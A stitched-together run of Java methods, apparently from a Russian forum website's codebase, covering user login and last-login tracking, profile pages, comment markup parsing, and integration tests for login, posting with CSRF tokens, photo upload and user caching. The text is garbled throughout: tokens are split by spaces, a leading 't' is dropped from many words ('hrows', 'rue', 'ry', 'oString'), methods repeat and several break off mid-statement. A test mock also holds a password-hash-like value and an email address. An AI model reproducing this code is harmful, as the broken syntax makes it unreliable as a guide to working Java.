private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response ) { HttpSession session = request . getSession ( ) ; AuthUtil . getCurrentUser ( ) . acegiSecurityHack ( response , session ) ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userDao . getUser ( username ) ; userDao . updateLastlogin ( user ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response ) { HttpSession session = request . getSession ( ) ; User user = AuthUtil . getCurrentUser ( ) ; if ( user ! = null ) { user . acegiSecurityHack ( response , session ) ; 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userDao . getUser ( username ) ; UserInfo userInfo = userDao . getUserInfoClass ( user ) ; Calendar hen = Calendar . getInstance ( ) ; hen . setTime ( userInfo . getLastLogin ( ) ) ; Calendar now = Calendar . getInstance ( ) ; now . add ( Calendar . MINUTE , - 60 ) ; int diff = now . compareTo ( hen ) ; if ( diff > 0 ) { userDao . updateLastlogin ( user ) ; } } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userDao . getUser ( username ) ; userDao . updateLastlogin ( user , false ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
public void updateLastlogin ( User user , boolean force ) { if ( force ) { jdbcTemplate . update ( " UPDATE users SET lastlogin=CURRENT_TIMESTAMP WHERE id=? " , user . getId ( ) ) ; 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) hrows Exception { Calendar current = Calendar . getInstance ( ) ; for ( int i = 0 ; i < 3 ; i + + ) { searchQueueSender . updateMonth ( current . get ( Calendar . YEAR ) , current . get ( Calendar . MONTH ) + 1 ) ; current . add ( Calendar . MONTH , - 1 ) ; } return new ModelAndView ( " action-done " , " message " , " Scheduled reindex last 3 month " ) ; } 
public static boolean isSessionAuthorized ( ) { Authentication authentication = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; return authentication ! = null & & ( authentication . isAuthenticated ( ) & & ! hasAuthority ( " ROLE_SYSTEM_ANONYMOUS " ) & & hasAuthority ( " ROLE_ANONYMOUS " ) ) ; } 
public boolean isAccountNonLocked ( ) { return ! user . isBlocked ( ) ; } 
public boolean isEnabled ( ) { return ! user . isBlocked ( ) ; } 
public static ResultSet getHizel ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 34590 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " hizel " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " DffBkILVpGCDTC8ykceJzvcj5dJbhF38 " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( " " ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( " hz@vyborg.ru " ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 0 ) ; return resultSet ; } 
public void hizelTest ( ) hrows Exception { ResultSet resultSet = Users . getHizel ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( " 0428dfed932b07ea582efd94038b1076 " , user . getActivationCode ( " secret " ) ) ; } 
public void commence ( HttpServletRequest request , HttpServletResponse response , AuthenticationException authException ) hrows IOException , ServletException { return ; } 
public boolean checkIP ( String addr ) hrows TextParseException { if ( addr . equals ( " 127.0.0.1 " ) ) { return false ; } String query = invertIPAddress ( addr ) + '.' + zone ; logger . debug ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( LOCAL_SERVER ) ; } 
public void estPostForm ( ) hrows IOException { ClientResponse cr = resource . path ( " add-section.jsp " ) . queryParam ( " section " , Integer . oString ( Section . SECTION_NEWS ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . oString ( ) ) ; assertFalse ( " missing csrf " , doc . select ( " input[name=csrf] " ) . isEmpty ( ) ) ; } 
public void estPostDenied ( ) hrows IOException { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " section " , Integer . oString ( Section . SECTION_FORUM ) ) ; formData . add ( " group " , Integer . oString ( TEST_GROUP ) ) ; ClientResponse cr = resource . path ( " add.jsp " ) . post ( ClientResponse . class , formData ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . oString ( ) ) ; System.out.println(doc.html()); assertFalse("not message form", doc.select("#messageForm").isEmpty()); assertFalse("missing error test", doc.select(".error").isEmpty()); assertFalse("missing csrf", doc.select("input[name=csrf]").isEmpty()); } 
public void estPostSuccess ( ) hrows IOException { String auth = doLogin ( ) ; MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " section " , Integer . oString ( Section . SECTION_FORUM ) ) ; formData . add ( " group " , Integer . oString ( TEST_GROUP ) ) ; formData . add ( " csrf " , " csrf " ) ; formData . add ( " itle " , TEST_TITLE ) ; ClientResponse cr = resource . path ( " add.jsp " ) . cookie ( new Cookie ( AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . oString ( ) ) ; assertTrue ( doc . select ( " .error " ) . ext ( ) , doc . select ( " #messageForm " ) . isEmpty ( ) ) ; assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr . getStatus ( ) ) ; ClientResponse empPage = resource TODO remove temp redirect from Controller .uri(cr.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_MOVED_TEMPORARILY, tempPage.getStatus()); ClientResponse page = resource .uri(tempPage.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_OK, page.getStatus()); Document finalDoc = Jsoup.parse(page.getEntityInputStream(), "UTF-8", resource.getURI().toString()); assertEquals(TEST_TITLE, finalDoc.select("h1[itemprop=headline] a").text()); } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( LOCAL_SERVER ) ; } 
public void estChangePassword ( ) { ClientResponse cr = resource . path ( " people/maxcom/edit " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; 
public String doLogin ( ) hrows IOException { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , TEST_USER ) ; formData . add ( " passwd " , TEST_PASSWORD ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; System.out.print(Jsoup.parse(cr.getEntityInputStream(), "utf-8", LOCAL_SERVER).html()); assertEquals(HttpStatus.SC_MOVED_TEMPORARILY, cr.getStatus()); String auth = getAuthCookie(cr); if(auth != null) { return auth; } Assert.fail("Can't find rememberme cookie"); return null; } 
public static String doLogin ( WebResource resource , String user , String password ) hrows IOException { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , user ) ; formData . add ( " passwd " , password ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; String auth = getAuthCookie ( cr ) ; if ( auth ! = null ) { return auth ; } return null ; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; } 
public void estPostSuccess ( ) hrows IOException { String auth = WebHelper . doLogin ( resource , TEST_USER , TEST_PASSWORD ) ; MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " section " , Integer . oString ( Section . SECTION_FORUM ) ) ; formData . add ( " group " , Integer . oString ( TEST_GROUP ) ) ; formData . add ( " csrf " , " csrf " ) ; formData . add ( " itle " , TEST_TITLE ) ; ClientResponse cr = resource . path ( " add.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . oString ( ) ) ; assertTrue ( doc . select ( " .error " ) . ext ( ) , doc . select ( " #messageForm " ) . isEmpty ( ) ) ; assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr . getStatus ( ) ) ; ClientResponse empPage = resource TODO remove temp redirect from Controller .uri(cr.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_MOVED_TEMPORARILY, tempPage.getStatus()); ClientResponse page = resource .uri(tempPage.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_OK, page.getStatus()); Document finalDoc = Jsoup.parse(page.getEntityInputStream(), "UTF-8", resource.getURI().toString()); assertEquals(TEST_TITLE, finalDoc.select("h1[itemprop=headline] a").text()); } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; } 
public void clean ( ) hrows Exception { User user = userDao . getUser ( " maxcom " ) ; UserInfo userInfo = userDao . getUserInfoClass ( user ) ; userDao . updateUser ( user , 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . add ( new UsersSectionStatEntry ( resultSet . getInt ( " section " ) , resultSet . getInt ( " c " ) ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { UserStatistics userStat = userDao . getUserStatisticsClass ( user ) ; mv . getModel ( ) . put ( " userStat " , userStat ) ; mv . getModel ( ) . put ( " sectionStat " , prepareSectionStats ( userStat ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( mpl . getCurrentUser ( ) , user ) ) ; } if ( mpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( mpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
private ImmutableList < PreparedUsersSectionStatEntry > prepareSectionStats ( UserStatistics userStat ) { return ImmutableList . copyOf ( Iterables . ransform ( 
public PreparedUsersSectionStatEntry apply ( UsersSectionStatEntry input ) { return new PreparedUsersSectionStatEntry ( sectionService . getSection ( input . getSection ( ) ) , 
private void rescueMaxcom ( ) hrows Exception { User user = userDao . getUser ( " maxcom " ) ; userDao . updateUser ( user , 
public void initResource ( ) hrows Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueMaxcom ( ) ; } 
public void clean ( ) hrows Exception { rescueMaxcom ( ) ; } 
public void fixUser ( ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , TEST_ID ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , TEST_ID ) ; } 
public void estUser ( ) hrows UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; assertNotNull ( user ) ; assertFalse ( user . isBlocked ( ) ) ; } 
public void estUserCached ( ) hrows UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , TEST_ID ) ; User userCached = userDao . getUserCached ( TEST_ID ) ; assertFalse ( userCached . isBlocked ( ) ) ; User userNotCached = userDao . getUser ( TEST_ID ) ; assertTrue ( userNotCached . isBlocked ( ) ) ; } 
public void estCachePutOnGet ( ) hrows UserNotFoundException { cache . evict ( TEST_ID ) ; User user = userDao . getUser ( TEST_ID ) ; assertNotNull ( user ) ; assertFalse ( user . isBlocked ( ) ) ; assertNotNull ( cache . get ( user . getId ( ) ) ) ; } 
public void estBlock ( ) hrows UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . blockWithoutTransaction ( user , user , " " ) ; User userAfter = userDao . getUser ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public void estCacheResetOnBlock ( ) hrows UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . blockWithoutTransaction ( user , user , " " ) ; User userAfter = userDao . getUserCached ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public UserDao userDao ( ) { return new UserDao ( ) ; } 
public IgnoreListDao ignoreListDao ( ) { return new IgnoreListDao ( ) ; } 
public CacheManager cacheManager ( ) { SimpleCacheManager cacheManager = new SimpleCacheManager ( ) ; cacheManager . setCaches ( ImmutableList . of ( new ConcurrentMapCache ( USERS_CACHE ) ) ) ; return cacheManager ; } 
public Cache usersCache ( CacheManager cacheManager ) { return cacheManager . getCache ( USERS_CACHE ) ; } 
private void rescueMaxcom ( ) hrows Exception { final User user = userDao . getUser ( " maxcom " ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user ) ; } 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user ) ; } 
public void initResource ( ) hrows Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void clean ( ) hrows Exception { rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void estSimple ( ) hrows IOException { String auth = WebHelper . doLogin ( resource , " JB " , JB_PASS ) ; ClientResponse cr = resource . path ( " people/JB/edit " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . oString ( ) ) ; assertEquals ( " /people/JB/edit " , doc . getElementById ( " editRegForm " ) . attr ( " action " ) ) ; String name = doc . getElementById ( " name " ) . val ( ) ; String url = doc . getElementById ( " url " ) . val ( ) ; String email = doc . getElementById ( " email " ) . val ( ) ; String own = doc . getElementById ( " own " ) . val ( ) ; String info = doc . getElementById ( " info " ) . val ( ) ; assertEquals ( JB_NAME , name ) ; assertEquals ( JB_URL , url ) ; assertEquals ( JB_EMAIL , email ) ; assertEquals ( JB_TOWN , own ) ; assertEquals ( JB_INFO , info ) ; MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " name " , name ) ; formData . add ( " url " , url ) ; formData . add ( " email " , email ) ; formData . add ( " own " , own ) ; formData . add ( " info " , info ) ; formData . add ( " csrf " , " csrf " ) ; formData . add ( " oldpass " , JB_PASS ) ; ClientResponse cr2 = resource . path ( " people/maxcom/edit " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr2 . getStatus ( ) ) ; assertEquals ( " http:127.0.0.1:8080/people/JB/profile " , cr2 . getLocation ( ) . oString ( ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = getIgnoreRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public ModelAndView showForm ( ServletRequest request ) hrows Exception { return new ModelAndView ( " addphoto " ) ; } 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user ) ; userDao . unblock ( user ) ; } 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( " JB " ) ; userDao . unblock ( user ) ; } 
public void initResource ( ) hrows Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueJB ( ) ; } 
public void clean ( ) hrows Exception { rescueJB ( ) ; } 
public void estSimple ( ) hrows IOException { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; String content = " This is a binary content " ; FormDataMultiPart form = new FormDataMultiPart ( ) ; form . bodyPart ( new FormDataBodyPart ( " csrf " , " csrf " ) ) ; form . bodyPart ( new FormDataBodyPart ( " file " , content . getBytes ( ) , new MediaType ( " image " , " jpeg " ) ) ) ; 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , rue ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public ModelMap showRemove ( @RequestParam ( required = false ) Integer pos , ServletRequest request ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesRequest form = new EditBoxesRequest ( ) ; form . setPosition ( pos ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public ModelAndView view ( ) { return new ModelAndView ( " edit-boxes " ) ; } 
public static ClientResponse addPhoto ( WebResource resource , String filename , String auth ) { File file = new File ( filename ) ; FormDataMultiPart form = new FormDataMultiPart ( ) ; form . bodyPart ( new FormDataBodyPart ( " csrf " , " csrf " ) ) ; form . bodyPart ( new FileDataBodyPart ( " file " , file ) ) ; return resource . path ( " addphoto.jsp " ) 
public void estPage ( ) hrows IOException { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public void initResource ( ) hrows Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; } 
public void est1GroupInfo ( ) hrows IOException { ClientResponse cr = resource . path ( " /forum/talks/ " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . oString ( ) ) ; assertTrue ( doc . select ( " .infoblock " ) . ext ( ) . length ( ) > 0 ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure , false ) ; return new PreparedComment ( comment , 
private String prepareCommentText ( MessageText messageText , final boolean secure , boolean nofollow ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , secure , nofollow ) ; 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) ) { return false ; } return author . getScore ( ) < TopicPermissionService . LINK_FOLLOW_MIN_SCORE ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { UserStatistics userStat = userDao . getUserStatisticsClass ( user ) ; mv . getModel ( ) . put ( " userStat " , userStat ) ; mv . getModel ( ) . put ( " sectionStat " , prepareSectionStats ( userStat ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( mpl . getCurrentUser ( ) , user ) ) ; } if ( mpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( mpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) , false ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
public String parseComment ( String ext , boolean secure , boolean nofollow ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , false , nofollow ) , ext ) . renderXHtml ( ) ; } 
public String parseCommentRSS ( String ext , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , rue , false ) , ext ) . renderXHtml ( ) ; } 
public String parseForOgDescription ( String ext ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , rue , false ) , ext ) . renderOg ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String format ( String ext , boolean secure , boolean nofollow ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , secure , nofollow ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public void processUrl ( boolean secure , boolean nofollow , @Nonnull StringBuilder out , @Nonnull String urlHref , @Nullable String linktext ) hrows URIException { LorURL url = new LorURL ( configuration . getMainURI ( ) , urlHref ) ; if ( url . isMessageUrl ( ) ) { processMessageUrl ( secure , out , url , linktext ) ; 
private void processMessageUrl ( boolean secure , @Nonnull StringBuilder out , @Nonnull LorURL url , @Nullable String linkText ) hrows URIException { ry { Topic message = messageDao . getById ( url . getMessageId ( ) ) ; 
